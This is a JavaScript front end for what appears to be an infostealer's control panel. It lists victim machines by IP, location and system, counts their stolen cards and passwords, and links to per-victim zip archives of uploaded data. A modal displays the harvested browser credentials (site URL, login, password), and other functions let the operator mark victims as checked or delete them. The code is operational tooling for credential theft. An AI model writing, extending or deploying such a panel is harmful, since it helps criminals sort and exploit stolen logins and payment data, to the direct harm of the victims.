$(function () {
	loadClients();

	$("#clients-search").keyup(function () {
		loadClients(this.value.trim() != "" ? this.value : null)
	});


	$("#modal-search").keyup(function () {
		loadInfo(this.value.trim() != "" ? this.value : null)
	})
})

function loadClients(query, page) {
	if (!page) page = 0;

	$.ajax({
		url: "/ajax/load.clients",
		type: "POST",
		data: {
			query: query,
			page: page,
		},
		json: true,
		success: function (data) {
			if (data.status) {
				if (page == 0) $("#clients").html("");

				$("#clients-table table").show();
				$("#list-more-clients").remove();

				data.response.map(function (row) {
					var presents = [];

					row.presents = row.presents.trim() != "" ? row.presents.split(",") : [];

					row.presents.map(function (category) {
						presents.push(EmojiPresents[category]);
					})

					$("#clients").append(
						'<tr id="client-' + row.id + '">' +
						'<td><span class="badge badge-dark">' + row.system + '</span><br>' +
						'<span class="badge badge-dark">' + utToDate(row.time) + '</span></td>' +
						'<td><span class="badge badge-dark"><a href=https://check-host.net/ip-info?host=' + row.ip + ' target=_blank>' + row.ip + '</a></span><br><span class="badge badge-dark">' + row.country + ' | ' + row.city + '</span></td>' +
						'<td>' + (presents.length ? presents.join(" ") : "💩") + '</td>' +
						'<td style="cursor:pointer" onclick="showInfo(\'ip\', \'' + row.ip + '\')"><span data-feather="credit-card"></span> ' + row.count_cards + '<br><span data-feather="lock"></span> ' + row.count_passwords + '</td>' +
						'<td>' +
						'<span class="badge badge-' + getStatus(row.checked).color + '">Check</span>' +
						'<br>' +
						'<span data-feather="x-circle" style="cursor:pointer" onclick="deleteClient(' + row.id + ')"></span>' +
						'<a href="/user/data/uploads/' + row.ip + '.zip"><span data-feather="arrow-down-circle"></span></a>' +
						'<span onclick="clientCheck(' + row.id + ')" style="cursor:pointer" data-feather="check-circle"></span>' +
						'</td>' +
						'</tr>'
					)
				})

				if (data.response.length >= 25) {
					$("#clients-table").append(
						'<button id="list-more-clients" onclick="loadClients(\'' + (query ? query : "") + '\', ' + (++page) + ')" class="btn btn-primary btn-block">Next (#' + (page) + ')</button>'
					);
				}

				feather.replace()
			} else alert(data.msg);
		}
	})
}

function getStatus(status) {
	switch (parseInt(status)) {
		case 0:
			return {
				color: "warning",
				text: "Check"
			};
		case 1:
			return {
				color: "success",
				text: "Check"
			};
		case 2:
			return {
				color: "danger",
				text: "None"
			};
		default:
			return {
				color: "primary",
				text: "Error"
			};
	}
}

function clientCheck(id) {
	$.ajax({
		url: "/ajax/client",
		type: "POST",
		data: {
			type: "checked",
			params: {
				id: id,
			},
		},
		json: true,
		success: function (data) {
			if (data.status) {
				$("#client-" + id + " .badge").removeClass("badge-success")
				$("#client-" + id + " .badge").removeClass("badge-warning")
				$("#client-" + id + " .badge").removeClass("badge-danger")
				$("#client-" + id + " .badge").addClass(data.checked ? "badge-success" : "badge-warning")
			} else alert(data.msg);
		}
	})
}

function deleteClient(id) {
	if (!confirm("Delete?")) return;
	$.ajax({
		url: "/ajax/client",
		type: "POST",
		data: {
			type: "delete",
			params: {
				id: id,
			},
		},
		json: true,
		success: function (data) {
			if (data.status) {
				loadClients()
				alert(data.msg);
			} else alert(data.msg);
		}
	})
}

var info = {
	type: null,
	param: null,
}

function showInfo(type, param) {
	info.type = type
	info.param = param

	$("#modal-block tbody").html("");
	$("#modal-block").modal()

	loadInfo()
}

function loadInfo(query, page) {
	if (!info.type) return;

	if (!page) page = 0;

	$("#list-more-info").remove();

	$.ajax({
		url: "/ajax/load.client.info",
		type: "POST",
		data: {
			type: info.type,
			param: info.param,
			query: query,
		},
		json: true,
		success: function (data) {
			if (data.status) {
				$("#modal-title").html("Check");

				$("#modal-block table").show()
				$("#list-more-info").remove();

				if (page == 0) $("#modal-block tbody").html("");

				data.response.map(function (row) {
					$("#modal-block tbody").append(
						'<tr>' +
						'<td><img src="/img/browsers/' + row.browser + '.svg" class="img-fluid" style="width:1rem" alt="' + row.browser + '" title="' + row.browser + '"></td>' +
						'<td><a href="//' + row.url + '" target="_blank">' + row.url + '</a></td>' +
						'<td>' + row.login + '</td>' +
						'<td>' + row.password + '</td>' +
						'</tr>'
					)
				})

				if (data.response.length >= 100) {
					$("#modal-block .modal-body").append(
						'<button id="list-more-info" onclick="loadInfo(\'' + (query ? query : "") + '\', ' + (++page) + ')" class="btn btn-primary btn-block">Next (#' + (page) + ')</button>'
					);
				}
			} else alert(data.msg);
		}
	})
feather.replace()
}